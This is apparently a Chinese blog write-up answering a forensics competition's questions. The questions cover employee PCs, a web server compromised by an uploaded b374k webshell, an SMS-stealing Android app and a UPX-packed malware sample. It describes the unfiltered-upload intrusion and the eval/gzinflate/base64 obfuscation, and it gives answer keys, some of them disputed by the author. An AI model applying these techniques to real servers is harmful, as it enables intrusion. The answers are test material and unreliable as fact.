title="4工地职员A的孩子有可能正准备就读什么学校"></a>4工地职员A的孩子有可能正准备就读什么学校</h2><blockquote><p>【单选题】工地职员A的孩子有可能正准备就读什么学校?(2分)</p><p>A.小学</p><p>B.中学</p><p><strong>C.幼儿园</strong></p><p>D.大学</p></blockquote><p>这题要根据从staffA电脑中找到的信息来判断了</p><p>浏览记录里可以发现一个幼儿园的入学申请:</p><img src="/images/meiya-2021-02/image-20220810190517188.png" alt="image-20220810190517188" style="zoom:67%;" /><br><h2 id="5工地职员A并没有打开过哪一个档案"><a href="#5工地职员A并没有打开过哪一个档案" class="headerlink" title="5工地职员A并没有打开过哪一个档案"></a>5工地职员A并没有打开过哪一个档案</h2><blockquote><p>【多选题】工地职员A并没有打开过那一个档案?(2分)</p><p><strong>A.Staff3.xlsx</strong></p><p><strong>B.Staf4.xisx</strong></p><p><strong>C.Slaf1. xisx</strong></p><p><strong>D.Staf2.xisx</strong></p><p>E.BTC address.bmp</p></blockquote><p>去<code>用户痕迹</code>-<code>最近访问记录</code>-<code>最近访问的文档</code>里依次对照选项</p><img src="/images/meiya-2021-02/image-20220810190700606.png" alt="image-20220810190700606" style="zoom:67%;" /><br><h2 id="6工地现员-A-的计算机被远程控制了多少分钟"><a href="#6工地现员-A-的计算机被远程控制了多少分钟" class="headerlink" title="6工地现员 A 的计算机被远程控制了多少分钟"></a>6工地现员 A 的计算机被远程控制了多少分钟</h2><p>根据开始和结束时间计算:</p><img src="/images/meiya-2021-02/image-20220810190746627.png" alt="image-20220810190746627" style="zoom:67%;" /><br><h2 id="7工地职员-A-的计算机被加密后-被要求存入何种虚拟货币"><a href="#7工地职员-A-的计算机被加密后-被要求存入何种虚拟货币" class="headerlink" title="7工地职员 A 的计算机被加密后,被要求存入何种虚拟货币"></a>7工地职员 A 的计算机被加密后,被要求存入何种虚拟货币</h2><blockquote><p>【单选题】工地职员 A 的计算机被加密后,被要求存入的虚拟货币是什么?(1分)</p><p>  A  比币现金</p><p>  <strong>B 比特币</strong></p><p>  C 以太币</p><p>  D 达币</p></blockquote><p>这题根据前面已经掌握的信息也已经很明显了(<strong>例如工地主管和Alex的WhatsApp聊天记录</strong>)</p><p>仿真进去看桌面上的信息也能知道:</p><img src="/images/meiya-2021-02/image-20220810190934533.png" alt="image-20220810190934533" style="zoom:67%;" /><br><h2 id="8在工地职员-A-的计算机曾经打开过的-Excal-档案中-多少人有可能在法律部门工作"><a href="#8在工地职员-A-的计算机曾经打开过的-Excal-档案中-多少人有可能在法律部门工作" class="headerlink" title="8在工地职员 A 的计算机曾经打开过的 Excal 档案中,多少人有可能在法律部门工作"></a>8在工地职员 A 的计算机曾经打开过的 Excal 档案中,多少人有可能在法律部门工作</h2><p>文档访问记录中显示staff1.xlsx被打开过.导出它,然后筛选出**legal,**共22个记录</p><img src="/images/meiya-2021-02/image-20220810191055023.png" alt="image-20220810191055023" style="zoom:67%;" /><br><h2 id="9工地职员B的计算机在什么日期和时间被黑客控制"><a href="#9工地职员B的计算机在什么日期和时间被黑客控制" class="headerlink" title="9工地职员B的计算机在什么日期和时间被黑客控制"></a>9工地职员B的计算机在什么日期和时间被黑客控制</h2><blockquote><p>【多选题】工地职员B的计算机在什么日期和时间被黑客控制?(2分)</p><p>A .2021—10—19</p><p>B .2021—09—16</p><p>C .11:16:41(UTC + 8:00)</p><p>D .05:55:50(UTC + 8:00)</p><p><strong>E . 18:40:06(UTC +8:00)</strong></p></blockquote><p>使用取证大师加载staffB镜像,自动取证后同样去找其被teamviewer连接的记录:</p><p>好像只有E项在该范围里</p><img src="/images/meiya-2021-02/image-20220810191241014.png" alt="image-20220810191241014" style="zoom:67%;" /><br><h2 id="10工地职员-B-的计算机的MAC-Address"><a href="#10工地职员-B-的计算机的MAC-Address" class="headerlink" title="10工地职员 B 的计算机的MAC Address"></a>10工地职员 B 的计算机的MAC Address</h2><p>自动取证结果里有:</p><img src="/images/meiya-2021-02/image-20220810191356933.png" alt="image-20220810191356933" style="zoom:67%;" /><br><h2 id="11工地职员-B-的计算机户FaFa的Profile-ID-是什么"><a href="#11工地职员-B-的计算机户FaFa的Profile-ID-是什么" class="headerlink" title="11工地职员 B 的计算机户FaFa的Profile ID 是什么"></a>11工地职员 B 的计算机户FaFa的Profile ID 是什么</h2><p>自动取证结果里有:</p><img src="/images/meiya-2021-02/image-20220810191619720.png" alt="image-20220810191619720" style="zoom:67%;" /><br><h2 id="12工地职员B办公室计算机的-Windows-CD-Key"><a href="#12工地职员B办公室计算机的-Windows-CD-Key" class="headerlink" title="12工地职员B办公室计算机的 Windows CD Key"></a>12工地职员B办公室计算机的 Windows CD Key</h2><p>仿真起来后 <code>win+r</code> +  <code>regedit.exe</code>进入<strong>注册表</strong></p><p><code>windows cd key</code>的路径是:<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\SoftwareProtectionPlatform\BackupProductKeyDefault</code></p><img src="/images/meiya-2021-02/image-20220810191812491.png" alt="image-20220810191812491" style="zoom:67%;" /><br><h2 id="13检查过工地职员-B-的计算机登录档案后-计算机感染了什么恶意软件"><a href="#13检查过工地职员-B-的计算机登录档案后-计算机感染了什么恶意软件" class="headerlink" title="13检查过工地职员 B 的计算机登录档案后,计算机感染了什么恶意软件"></a>13检查过工地职员 B 的计算机登录档案后,计算机感染了什么恶意软件</h2><blockquote><p>【单选题】检查过工地职员 B 的计算机登录档案后( Wndow Registry )，计算机感染了什么恶意软件?(1分)</p><p>A . Adware</p><p>B . Worms</p><p>C . Rootkits</p><p><strong>D .没有感染任何恶意软件</strong></p></blockquote><p>这个好像仿真起来之后,用火绒之类的软件扫描一下?</p><br><h2 id="14工地职员-B-的计算机中被加密分区内的图片-120778782-58759559-jpg有可能是从何途径载入计算机"><a href="#14工地职员-B-的计算机中被加密分区内的图片-120778782-58759559-jpg有可能是从何途径载入计算机" class="headerlink" title="14工地职员 B 的计算机中被加密分区内的图片_120778782_58759559.jpg有可能是从何途径载入计算机"></a>14工地职员 B 的计算机中被加密分区内的图片_120778782_58759559.jpg有可能是从何途径载入计算机</h2><blockquote><p>【单选题】工地职员 B 的计算机中被加密便盘内的图片”_120778782_58759559.jpg”,有可能是从下列哪个途径载入计算机？</p><p>A .电邮下载附件</p><p>B . USB</p><p><strong>C . 网上下载</strong></p><p>D . 蓝牙传入</p><p>E . Direct-Link</p></blockquote><p>使用BitLocker解密分区后,找到这张图片:</p><img src="/images/meiya-2021-02/image-20220810193051134.png" alt="image-20220810193051134" style="zoom:67%;" /><p>从浏览器的下载记录中也能够找到对应的记录:</p><img src="/images/meiya-2021-02/image-20220810193135088.png" alt="image-20220810193135088" style="zoom:67%;" /><br><h2 id="15工地职员B的计算机中被加密硬盘内的图片中-人物穿着有什么颜色"><a href="#15工地职员B的计算机中被加密硬盘内的图片中-人物穿着有什么颜色" class="headerlink" title="15工地职员B的计算机中被加密硬盘内的图片中,人物穿着有什么颜色"></a>15工地职员B的计算机中被加密硬盘内的图片中,人物穿着有什么颜色</h2><blockquote><p>【多选题】工地职员B的计算机中被加密硬盘内的图片中,人物中农着有什么颜色?(2分)</p><p>A . 黄色</p><p><strong>B .红色</strong></p><p>C .紫色</p><p>D . 蓝色</p><p><strong>E . 绿色</strong></p></blockquote><p>这都什么奇奇怪怪的题…</p><p>从该分区内查看下图片就行了:</p><img src="/images/meiya-2021-02/image-20220810193426764.png" alt="image-20220810193426764" style="zoom:67%;" /><br><h2 id="16工地职员-B-的计算机有多个磁盘分区"><a href="#16工地职员-B-的计算机有多个磁盘分区" class="headerlink" title="16工地职员 B 的计算机有多个磁盘分区"></a>16工地职员 B 的计算机有多个磁盘分区</h2><p>直接数数有5个</p><img src="/images/meiya-2021-02/image-20220810194014000.png" alt="image-20220810194014000" style="zoom:67%;" /><br><h2 id="17工地职员B的计算机硬盘分割表是什么"><a href="#17工地职员B的计算机硬盘分割表是什么" class="headerlink" title="17工地职员B的计算机硬盘分割表是什么"></a>17工地职员B的计算机硬盘分割表是什么</h2><p>仿真起来后,安装vmtool,然后把<code>diskgenius</code>软件拖进去打开,可以看到硬盘分割表类型</p><img src="/images/meiya-2021-02/image-20220810194323056.png" alt="image-20220810194323056" style="zoom:67%;" /><br><h2 id="18工地职员B的计算机EventLog中最后登入时services-exe的Prccess-ID"><a href="#18工地职员B的计算机EventLog中最后登入时services-exe的Prccess-ID" class="headerlink" title="18工地职员B的计算机EventLog中最后登入时services .exe的Prccess ID"></a>18工地职员B的计算机EventLog中最后登入时services .exe的Prccess ID</h2><p>在日志中,在<code>描述</code>列中筛选<code>service.exe</code>,在<code>分类</code>列中筛选<code>登录</code></p><p>然后找到最近的一项,下面可以看到<code>Pross ID</code>为1833</p><p><img src="/images/meiya-2021-02/111.png" alt="image-111"></p><br><hr><br><h1 id="PART2元材原料网页服务器"><a href="#PART2元材原料网页服务器" class="headerlink" title="PART2元材原料网页服务器"></a>PART2元材原料网页服务器</h1><h2 id="19什么IP曾经上传档案到网页服务器"><a href="#19什么IP曾经上传档案到网页服务器" class="headerlink" title="19什么IP曾经上传档案到网页服务器"></a>19什么IP曾经上传档案到网页服务器</h2><p>这是一台windows系统的网站服务器</p><p>查看<code>apache</code>日志,过滤访问方式<code>POST</code>,可以发现<code>203.145.94.120</code>多次以POST的方式访问上传功能(<code>uploader.php</code>)</p><p><img src="/images/meiya-2021-02/2.png" alt="image-2"></p><br><h2 id="20接上题-以下哪些档案曾被上传到网页服务器"><a href="#20接上题-以下哪些档案曾被上传到网页服务器" class="headerlink" title="20接上题,以下哪些档案曾被上传到网页服务器"></a>20接上题,以下哪些档案曾被上传到网页服务器</h2><blockquote><p>【多选题】承上题,以下哪些档案曾被上传到网页服务器?(3分)</p><p><strong>A .kjk2.jpg</strong></p><p><strong>B kjk2.php</strong></p><p>C b6778k-9.0.php</p><p><strong>D b374k-2.5.php</strong></p><p>E d374k-2.5.php</p></blockquote><p>在203.145.94.120的访问记录中首先可以发现一个名为<code>b374k-2.5.php</code>的文件被多次执行</p><p>且这个脚本被执行之前,先多次执行了<code>upload</code>功能,因此可以推测<strong>之前是在将这个脚本文件上传到服务器</strong></p><p>进一步取消对<code>POST</code>的筛选,按照时间线来看:</p><p><img src="/images/meiya-2021-02/3.png" alt="image-3"></p><p>这里执行一次<code>upload</code>后,就<code>get</code>方式访问<code>kjk2.jpg</code>,接着又执行一次<code>upload</code>后,get访问<code>kjk2.php</code></p><p>找到<code>kjk2.php</code>这个文件,发现它确实是一张图片</p><img src="/images/meiya-2021-02/4.png" alt="image-4" style="zoom:67%;" /><p>这里可以猜测上传者修改了<code>kjk2.jpg</code>的扩展名为<code>php</code>来<strong>试探</strong>服务器后端是否存在<strong>针对文件类型的上传过滤</strong></p><p>在确认不存在<strong>针对文件类型的上传过滤后</strong>,上传者上传了<code>b374k-2.5.php</code></p><p>然后多次通过<code>post</code>的方式访问它,那么这个<code>b374k-2.5.php</code>应该就是执行攻击的脚本了</p><br><h2 id="21入侵者可能使用什么漏洞入侵网页服务器"><a href="#21入侵者可能使用什么漏洞入侵网页服务器" class="headerlink" title="21入侵者可能使用什么漏洞入侵网页服务器"></a>21入侵者可能使用什么漏洞入侵网页服务器</h2><blockquote><p>【单选题】入侵者可能使用甚么漏洞进行入侵网页服务器?(1分)</p><p><strong>A .文件上传漏洞</strong></p><p>B SQL 注入</p><p>C 跨站脚本攻击</p><p>D 格式化字将串弱点</p></blockquote><p>上一题得知是通过上传脚本并执行来实现攻击</p><p>那么就是文件上传漏洞</p><br><h2 id="22在网页服务器得到的所有文件档-doc-及-doex-中-有哪些作者"><a href="#22在网页服务器得到的所有文件档-doc-及-doex-中-有哪些作者" class="headerlink" title="22在网页服务器得到的所有文件档( doc 及 doex )中,有哪些作者"></a>22在网页服务器得到的所有文件档( doc 及 doex )中,有哪些作者</h2><blockquote><p>【多选题】在网页服务器得到的所有文件档( doc 及 doex )中,有以下哪些文件制作人(Author) ?(2分)</p><p><strong>A. Kevin L.Brown</strong></p><p>B Peter R.Lee </p><p><strong>C Mary</strong></p><p>D May</p><p>E Colin</p></blockquote><p>这题可以使用取证大师小程序-<code>office文档元数据解析</code>来完成</p><img src="/images/meiya-2021-02/5.png" alt="image-5" style="zoom:67%;" /><br><h2 id="23在网页服务器中-哪个是可疑档案-它如何取得计算机控制权"><a href="#23在网页服务器中-哪个是可疑档案-它如何取得计算机控制权" class="headerlink" title="23在网页服务器中,哪个是可疑档案,它如何取得计算机控制权"></a>23在网页服务器中,哪个是可疑档案,它如何取得计算机控制权</h2><blockquote><p>【多选题】在网页服务器中,哪个是可疑档案?它如何获得计算机控制权?(3分)</p><p>A可疑档案:b677Bk—9.0.php</p><p><strong>B可疑档案:b374k—25. php</strong></p><p>C可档案: upload.php</p><p><strong>D透过浏究器远程管理取得计算机控制权</strong></p><p>E透过远程工具PuTTY取得计算机控制权</p></blockquote><p>根据21题已经知道:<code>b374k-2.5.php</code>这个脚本执行了攻击</p><p>将它导出并查看,可以发现<code>eval</code>这个<strong>一句话木马</strong>关键字</p><img src="/images/meiya-2021-02/6.png" alt="image-6" style="zoom:67%;" /><p>而且前面的注释中给了网址,这个脚本应该不是私人编写的</p><img src="/images/meiya-2021-02/7.png" alt="image-7" style="zoom:67%;" /><p>那么这里就可以明确:</p><p>攻击者通过<code>upload</code>功能上传了b374k这个脚本文件,并使用浏览器通过此脚本实现远程控制</p><br><h2 id="24在网页服务器中-运行可疑档案需要密码-其密码的哈希值是甚么"><a href="#24在网页服务器中-运行可疑档案需要密码-其密码的哈希值是甚么" class="headerlink" title="24在网页服务器中,运行可疑档案需要密码,其密码的哈希值是甚么"></a>24在网页服务器中,运行可疑档案需要密码,其密码的哈希值是甚么</h2><p>这里在<code>b374k-2.5.php</code>这个脚本的源码中也给出来了</p><img src="/images/meiya-2021-02/6.png" alt="image-6" style="zoom:67%;" /><p>这里的注释已经说明了,<code>s_pass</code>这个变量为密码的<code>md5</code>哈希值</p><br><h2 id="25在网页服务器中，可疑档案的译码函数是什么"><a href="#25在网页服务器中，可疑档案的译码函数是什么" class="headerlink" title="25在网页服务器中，可疑档案的译码函数是什么"></a>25在网页服务器中，可疑档案的译码函数是什么</h2><blockquote><p>【单选题】在网特服务器中，可疑档案的译码函数是什么？（2分）</p><p>A . unzip _ file (‘$x,$y’)</p><p>B . gzdccode(base64_decode($x))</p><p>C . gzinflate(base64_ decode($x))</p><p>D .以上皆否</p></blockquote><p>参照<code>eval</code>的拼接方式,这里应该是为了<strong>绕过一些敏感函数的检测</strong></p><p>可以看到后面拼接起来的这个函数是 <code>gzinflate</code>, 后面的参数里有个拼接起来的<code>decode</code>,也可以说明这个是译码函数</p><img src="/images/meiya-2021-02/8.png" alt="image-8" style="zoom:67%;" /><p>通过分析上面的代码可知:</p><p>脚本本身是通过<code>eval</code>来执行<code>gzinflate(base64_decode($x))</code>,首先进行<code>base64</code>解码,再通过<code>gzinflate</code>函数来压缩 </p><p>而真正的程序代码是最下面一行那一长串<code>base64</code>码,它们被解码之后才能发挥作用</p><br><h2 id="26解压后的脚本文档的档案大小是多少"><a href="#26解压后的脚本文档的档案大小是多少" class="headerlink" title="26解压后的脚本文档的档案大小是多少"></a>26解压后的脚本文档的档案大小是多少</h2><p>为了得到源码,最简单的办法就是将上述功能再执行一遍,得到真正的脚本代码</p><p>可以使用取证大师里的开发模式写一个简单的解压脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> forensics <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_debug</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    启用调试功能，此函数不要修改</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    mydebug.start_debug()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gzinflate_base64_de</span>(<span class="params">str_base64</span>):</span><br><span class="line">    compressed_data = base64.b64decode(str_base64) <span class="comment"># 先对原数据进行base64解码</span></span><br><span class="line">    <span class="keyword">return</span> zlib.decompress(compressed_data, -<span class="number">15</span>) <span class="comment"># 再对解码后的数据进行压缩,相当于php文件中的gzinflate函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line"></span><br><span class="line">    str_base64 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    这里放待解压的脚本代码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    real_data = gzinflate_base64_de(str_base64)</span><br><span class="line">    <span class="comment"># 将解码后的脚本文件写入txt文件中</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:/decode_temp.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(real_data)</span><br></pre></td></tr></table></figure><p>解压后得到了可阅读的<code>php</code>脚本文件:</p><img src="/images/meiya-2021-02/9.png" alt="image-9" style="zoom:67%;" /><p>查看大小为<strong>109041</strong>字节</p><img src="/images/meiya-2021-02/10.png" alt="image-10" style="zoom:67%;" /><br><h2 id="27解压后的脚本文件内有甚么功能"><a href="#27解压后的脚本文件内有甚么功能" class="headerlink" title="27解压后的脚本文件内有甚么功能"></a>27解压后的脚本文件内有甚么功能</h2><blockquote><p>【多选题】解压后的脚本文件内有甚么功能?(3分)</p><p><strong>A 编辑文件</strong></p><p><strong>B 删除文件</strong></p><p>C 更改用户密码</p><p>D .加密文件</p><p><strong>E .重新命名文件</strong></p></blockquote><p>根据23题,在网上就可以搜索到b374k脚本的功能:</p><img src="/images/meiya-2021-02/11.png" alt="image-11" style="zoom:67%;" /><br><h2 id="28解压后的脚本含有压缩功能-当中使用的解压方法是甚么"><a href="#28解压后的脚本含有压缩功能-当中使用的解压方法是甚么" class="headerlink" title="28解压后的脚本含有压缩功能,当中使用的解压方法是甚么"></a>28解压后的脚本含有压缩功能,当中使用的解压方法是甚么</h2><blockquote><p>【单选题】解压后的脚本含有压缩功能,当中使用的解压方法是甚么?(2分)</p><p>A. PclZip . php</p><p>B Unzip _gz()</p><p><strong>C ZipArchive()</strong></p><p>D 以上皆否</p></blockquote><p>累了,直接在解压后的脚本里搜选项:</p><img src="/images/meiya-2021-02/12.png" alt="image-12" style="zoom:67%;" /><br><hr><br><h1 id="PART3特普手机"><a href="#PART3特普手机" class="headerlink" title="PART3特普手机"></a>PART3特普手机</h1><h2 id="29特普电话中一张照片包含哪些文字"><a href="#29特普电话中一张照片包含哪些文字" class="headerlink" title="29特普电话中一张照片包含哪些文字"></a>29特普电话中一张照片包含哪些文字</h2><blockquote><p>【多选题】特普的电话中一张于2021年09月30日10:45:12拍摄的相片包含以哪些字?(1分)</p><p>A 精忠</p><p>B 报国</p><p><strong>C 忠诚</strong> </p><p><strong>D 勇毅</strong></p></blockquote><p>根据时间过滤出这张图片,发现是一张二维码</p><img src="/images/meiya-2021-02/13.png" alt="image-13" style="zoom: 67%;" /><p>使用网上的解码平台解码:</p><img src="/images/meiya-2021-02/14.png" alt="image-14" style="zoom: 67%;" /><br><h2 id="30特普电话中有哪些其他人的WhatsApp用户数据记录"><a href="#30特普电话中有哪些其他人的WhatsApp用户数据记录" class="headerlink" title="30特普电话中有哪些其他人的WhatsApp用户数据记录"></a>30特普电话中有哪些其他人的WhatsApp用户数据记录</h2><blockquote><p>【多选题】特普的电电话中的 whatsapp 账号<a href="mailto:&#56;&#x35;&#x32;&#54;&#56;&#52;&#x32;&#x31;&#x34;&#x39;&#53;&#x40;&#x36;&#x2e;&#x77;&#x68;&#x61;&#116;&#x73;&#97;&#x70;&#112;&#x2e;&#110;&#101;&#116;">&#56;&#x35;&#x32;&#54;&#56;&#52;&#x32;&#x31;&#x34;&#x39;&#53;&#x40;&#x36;&#x2e;&#x77;&#x68;&#x61;&#116;&#x73;&#97;&#x70;&#112;&#x2e;&#110;&#101;&#116;</a>中,有哪些其他人的WhatsApp 用户数据记录？（2分）AD</p><p>A .85222117188@ s.whatsapp.net</p><p>B .85289853825@ s.whatsapp.net</p><p>C .85264795287@ s.whatsapp.net</p><p>D .85231882226@ s.whatsapp.net</p></blockquote><p>从分析结果中找不到上述记录,但是可以定位WhatsApp的数据库路径:</p><img src="/images/meiya-2021-02/15.png" alt="image-15" style="zoom: 67%;" /><p>在数据库里可以找到存储的联系人:</p><img src="/images/meiya-2021-02/16.png" alt="image-16" style="zoom: 67%;" /><br><h2 id="31特普于经纬度22-278843-114-165783没有做什么"><a href="#31特普于经纬度22-278843-114-165783没有做什么" class="headerlink" title="31特普于经纬度22.278843,114.165783没有做什么"></a>31特普于经纬度22.278843,114.165783没有做什么</h2><blockquote><p>【多选题】特普于经纬度22.278843,114.165783,没有做什么?(2分)</p><p><strong>A 拍影片</strong></p><p>B拍照</p><p><strong>C 使用 google map</strong></p><p><strong>D .在 Whatsapp 中分享实时位置</strong></p></blockquote><p>在位置一栏中找到题目中的坐标,发现这个坐标来自于拍摄的照片</p><p>那么没有做的事就是另外三项</p><img src="/images/meiya-2021-02/17.png" alt="image-17" style="zoom: 67%;" /><br><h2 id="32特普电话的热点分享密码"><a href="#32特普电话的热点分享密码" class="headerlink" title="32特普电话的热点分享密码"></a>32特普电话的热点分享密码</h2><blockquote><p>【单选题】特普电话的热点分享密码是什么?(1分)</p><p>A .12345678</p><p>B .69447401bceb</p><p>C .Jioijo4542554</p><p>D . Dak Pou Home</p></blockquote><p>安卓系统的热点信息存储位置:<code>USERDATA分区/misc/wifi/softap.conf</code></p><p>找到这个文件查看即可:</p><img src="/images/meiya-2021-02/18.png" alt="image-18" style="zoom: 67%;" /><br><h2 id="33特普于电话中安装了一个可疑软件-其安装包的描述哪些正确"><a href="#33特普于电话中安装了一个可疑软件-其安装包的描述哪些正确" class="headerlink" title="33特普于电话中安装了一个可疑软件,其安装包的描述哪些正确"></a>33特普于电话中安装了一个可疑软件,其安装包的描述哪些正确</h2><blockquote><p>【多选题】特普于电话中安装了一个可疑软件（版本为2020033001），跟据该可疑软件的安装档,下列哪项描述正确?(2分)</p><p><strong>A 软件名称是安全防护</strong></p><p>B 软件名称是安心润家</p><p>C .软件签名( signAlgorithm )以SHA512withRSA加密</p><p>D .封包名称(packageName)是org.chromium.webapk .a5b80edf82b436506_v2</p></blockquote><p>通过题目中给的版本号来过滤出这个apk文件:</p><img src="/images/meiya-2021-02/19.png" alt="image-19" style="zoom: 67%;" /><p>导出后使用雷电APP分析软件加载:</p><img src="/images/meiya-2021-02/20.png" alt="image-20" style="zoom: 67%;" /><p><img src="/images/meiya-2021-02/image-20220811235451054.png" alt="image-20220811235451054"></p><p>根据得到的信息对照,选项中只有A正确</p><br><h2 id="34该可疑软件安装包涉及哪些权限"><a href="#34该可疑软件安装包涉及哪些权限" class="headerlink" title="34该可疑软件安装包涉及哪些权限"></a>34该可疑软件安装包涉及哪些权限</h2><blockquote><p>【多选题】特普于电话中安装了一个可疑软件(版本为2020033001),根据该可疑软件的安装档,可疑软件中涉及以下安全许可？</p><p><strong>A . android.permission.READ_SMS读取信内容</strong></p><p><strong>B . android.permission.SEND_SMS发送短信</strong></p><p><strong>C . android.permission.READ_CONTACTS读取联系人</strong></p><p>D . android.permission.BLUETOOTH使用蓝牙</p><p>E . android.permission.CLEAR_APP_CACHE清除缓存</p></blockquote><img src="/images/meiya-2021-02/21.png" alt="image-21" style="zoom: 67%;" /><h2 id="35特普可能在电话中被可疑饮件窃取了的验证码是什么"><a href="#35特普可能在电话中被可疑饮件窃取了的验证码是什么" class="headerlink" title="35特普可能在电话中被可疑饮件窃取了的验证码是什么"></a>35特普可能在电话中被可疑饮件窃取了的验证码是什么</h2><p>根据34题已经知道该可疑APP具有读取短信内容的权限</p><p>而验证码一般也是通过短信来发送的,那么可以先看看短信中有哪些验证码:</p><img src="/images/meiya-2021-02/22.png" alt="image-22" style="zoom: 67%;" /><p>进一步验证可疑程序是不是窃取了这个验证码:</p><p>先将<code>userdata-www.icthna.net(该APP的包名)</code>这个目录导出,其存放的是该程序的应用数据</p><p>在一个文件中发现了此验证码:</p><img src="/images/meiya-2021-02/23.png" alt="image-23" style="zoom: 67%;" /><br><hr><br><h1 id="PART4特普Windows-x2F-内存"><a href="#PART4特普Windows-x2F-内存" class="headerlink" title="PART4特普Windows&#x2F;内存"></a>PART4特普Windows&#x2F;内存</h1><h2 id="36特普计算机中了病毒-该病毒的加壳方式"><a href="#36特普计算机中了病毒-该病毒的加壳方式" class="headerlink" title="36特普计算机中了病毒,该病毒的加壳方式"></a>36特普计算机中了病毒,该病毒的加壳方式</h2><p>首先需要找到该病毒文件</p><p>取证大师加载镜像后,从镜像的<code>user/download</code>目录下找到了一个疑似恶意程序的<code>malware.exe</code></p><img src="/images/meiya-2021-02/24.png" alt="image-24" style="zoom: 67%;" /><p>将其导出,并使用**detect it easy(die)**工具查壳:</p><img src="/images/meiya-2021-02/25.png" alt="image-25" style="zoom: 67%;" /><p>可以看到加壳方法是<code>UPX</code>,那么为了继续分析该恶意程序,首先需要脱壳</p><p>使用<code>UPX</code>加壳和脱壳工具对该文件进行解压(脱壳)</p><img src="/images/meiya-2021-02/26.png" alt="image-26" style="zoom: 67%;" /><p>得到脱壳后的文件:</p><img src="/images/meiya-2021-02/27.png" alt="image-27" style="zoom: 67%;" /><br><h2 id="37病毒的编译工具是什么"><a href="#37病毒的编译工具是什么" class="headerlink" title="37病毒的编译工具是什么"></a>37病毒的编译工具是什么</h2><blockquote><p>【单选题】特普的计算机可能中了病毒，病毒的编译工具是甚么？（2分）</p><p>A GCC</p><p>B Borland</p><p>C TCC</p><p><strong>D Microsoft Visual C&#x2F;C++</strong></p></blockquote><p>继续使用<code>die</code>工具来检测脱壳后的病毒文件,就可以看到其使用的编译工具了</p><img src="/images/meiya-2021-02/28.png" alt="image-28" style="zoom: 67%;" /><br><h2 id="38病毒的编译者可能使用的账户名称"><a href="#38病毒的编译者可能使用的账户名称" class="headerlink" title="38病毒的编译者可能使用的账户名称"></a>38病毒的编译者可能使用的账户名称</h2><p>使用<code>IDA</code>来分析脱壳后的病毒:</p><img src="/images/meiya-2021-02/29.png" alt="image-29" style="zoom: 67%;" /><p>在<code>string</code>视图中可以看到一个路径字符串,这里<code>user</code>后的<code>gpgf</code>应该就是一个账户名</p><br><h2 id="39病毒的自我复制位置"><a href="#39病毒的自我复制位置" class="headerlink" title="39病毒的自我复制位置"></a>39病毒的自我复制位置</h2><blockquote><p>特普的计算机可能中了病毒，病毒的自我复制位置是甚么？（2分）</p><p>A C:\Temp\temp.txt</p><p><strong>B C:\Users&lt;profile&gt;\Desktop\malware.exe</strong></p><p>C C:\Users\public\malware.exe</p><p>D C:\a.txt</p></blockquote><p>在函数中发现了用于复制文件的<code>CopyFileA</code>和<code>GetModuleFileNameA</code>函数</p><img src="/images/meiya-2021-02/30.png" alt="image-30" style="zoom: 67%;" /><p>顺着这两个函数来到它们被调用的地方:</p><img src="/images/meiya-2021-02/31.png" alt="image-31" style="zoom: 67%;" /><p>可以看到在<code>call copyFIleA</code>之前,通过<code>push</code>将若干数据入栈</p><p>这些入栈的数据中包括 <code>copyFIleA</code>需要使用到的参数</p><p>在参数中通过将从<code>004011D2</code>到<code>004011AE</code>拼接起来可以得到<code>C:\\Users\\public\\malware.exe</code>(<strong>例如55h表示单个字母U</strong>)</p><p>(官方答案给了D,没看明白…)</p><br><h2 id="40病毒修改登录文件的位置"><a href="#40病毒修改登录文件的位置" class="headerlink" title="40病毒修改登录文件的位置"></a>40病毒修改登录文件的位置</h2><blockquote><p>【单选题】特普的计算机可能中了病毒，病毒的修改登录文件位置是甚么？（3分）</p><p>A HKLM\SoftwarelMicrosoftwindows\CurrentVersion\Run</p><p>B HKCU\Software\Microsoftwwindows\CurrentVersion\ RunOnce</p><p>C HKLM\SOFTWARE\Microsoft\windowsNT\CurrentVersion\Profile List</p><p><strong>D HKLM\SOFTWARE\MicrosoftwWindowsCurrentVersion\Authentication\LogonUNBackground</strong></p></blockquote><p><strong>修改登录位置需要更改注册表</strong></p><p>找到和注册表相关的函数:</p><img src="/images/meiya-2021-02/32.png" alt="image-32" style="zoom: 67%;" /><p>双击,跟进这个函数</p><img src="/images/meiya-2021-02/33.png" alt="image-33" style="zoom: 67%;" /><p>上图中, <code>CODE XREF</code>表示<strong>代码交叉引用</strong>的意思; <code>DATA XREF</code>表示<strong>数据交叉引用</strong></p><p><code>CODE XREF</code>前面表示被引用者,后面表示引用者</p><p>那么上图中可以看出: <code>text:004013DF</code>这个位置的代码引用了 <code>RegSetValueExW</code>这个函数</p><p>按照常识,在引用函数之前,需要通过<code>push</code>来传参</p><p>那么接着跳转到<code>text:004013DF</code>,在其附近果然发现了像路径一样的参数:</p><img src="/images/meiya-2021-02/34.png" alt="image-34" style="zoom: 67%;" 